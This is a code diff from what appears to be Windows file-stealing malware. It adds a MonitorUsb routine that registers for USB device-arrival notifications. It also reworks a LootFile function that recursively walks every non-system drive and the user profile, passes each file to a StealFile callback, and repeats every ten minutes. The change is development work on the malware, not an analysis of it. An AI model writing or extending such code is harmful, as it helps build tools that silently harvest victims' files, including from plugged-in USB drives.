@@ -117,6 +117,10 @@ VOID FreeGlobalConfig
 
 			FREE(pConfig->MonitoredFolder);
 		}
+
+		if (pConfig->hDevNotify != NULL) {
+			UnregisterDeviceNotification(pConfig->hDevNotify);
+		}
 		
 		FREE(pConfig);
 	}
@@ -1598,6 +1602,31 @@ VOID MonitorAndLoot
 	}
 }
 
+VOID MonitorUsb
+(
+	_In_ PGLOBAL_CONFIG pConfig
+)
+{
+	DEV_BROADCAST_DEVICEINTERFACE_W DeviceInterface;
+	HDEVNOTIFY hNotify = NULL;
+	GUID UsbDeviceGUID = { 0xA5DCBF10L, 0x6530, 0x11D2, { 0x90, 0x1F, 0x00, 0xC0, 0x4F, 0xB9, 0x51, 0xED } };
+
+	SecureZeroMemory(&DeviceInterface, sizeof(DeviceInterface));
+	DeviceInterface.dbcc_size = sizeof(DeviceInterface);
+	DeviceInterface.dbcc_devicetype = DBT_DEVTYP_DEVICEINTERFACE;
+	memcpy(&DeviceInterface.dbcc_classguid, &UsbDeviceGUID, sizeof(DeviceInterface.dbcc_classguid));
+
+	hNotify = RegisterDeviceNotificationW(NULL, &DeviceInterface, DEVICE_NOTIFY_WINDOW_HANDLE);
+	if (hNotify == NULL) {
+		LOG_ERROR("RegisterDeviceNotificationW", GetLastError());
+		goto CLEANUP;
+	}
+
+	pConfig->hDevNotify = hNotify;
+CLEANUP:
+	return;
+}
+
 VOID LootFile
 (
 	_In_ PGLOBAL_CONFIG pConfig
@@ -1608,24 +1637,27 @@ VOID LootFile
 	WCHAR wszUserProfile[MAX_PATH];
 	LPWSTR lpTemp = NULL;
 
-	SecureZeroMemory(wszLogicalDrives, sizeof(wszLogicalDrives));
-	GetLogicalDriveStringsW(_countof(wszLogicalDrives), wszLogicalDrives);
-	lpTemp = wszLogicalDrives;
-	GetSystemDirectoryW(wszSystem32, _countof(wszSystem32));
 	while (TRUE) {
-		if (lpTemp[0] == L'\0') {
-			break;
-		}
+		SecureZeroMemory(wszLogicalDrives, sizeof(wszLogicalDrives));
+		GetLogicalDriveStringsW(_countof(wszLogicalDrives), wszLogicalDrives);
+		lpTemp = wszLogicalDrives;
+		GetSystemDirectoryW(wszSystem32, _countof(wszSystem32));
+		while (TRUE) {
+			if (lpTemp[0] == L'\0') {
+				break;
+			}
 
-		if (IsStrStartsWithW(wszSystem32, lpTemp)) {
+			if (IsStrStartsWithW(wszSystem32, lpTemp)) {
+				lpTemp += lstrlenW(lpTemp) + 1;
+				continue;
+			}
+
+			ListFileEx(lpTemp, LIST_RECURSIVELY | LIST_JUST_FILE, (LIST_FILE_CALLBACK)StealFile, pConfig);
 			lpTemp += lstrlenW(lpTemp) + 1;
-			continue;
 		}
 
-		ListFileEx(lpTemp, LIST_RECURSIVELY | LIST_JUST_FILE, (LIST_FILE_CALLBACK)StealFile, pConfig);
-		lpTemp += lstrlenW(lpTemp) + 1;
+		ExpandEnvironmentStringsW(L"%USERPROFILE%", wszUserProfile, _countof(wszUserProfile));
+		ListFileEx(wszUserProfile, LIST_RECURSIVELY | LIST_JUST_FILE, (LIST_FILE_CALLBACK)StealFile, pConfig);
+		Sleep(600000);
 	}
-
-	ExpandEnvironmentStringsW(L"%USERPROFILE%", wszUserProfile, _countof(wszUserProfile));
-	ListFileEx(wszUserProfile, LIST_RECURSIVELY | LIST_JUST_FILE, (LIST_FILE_CALLBACK)StealFile, pConfig);
 }
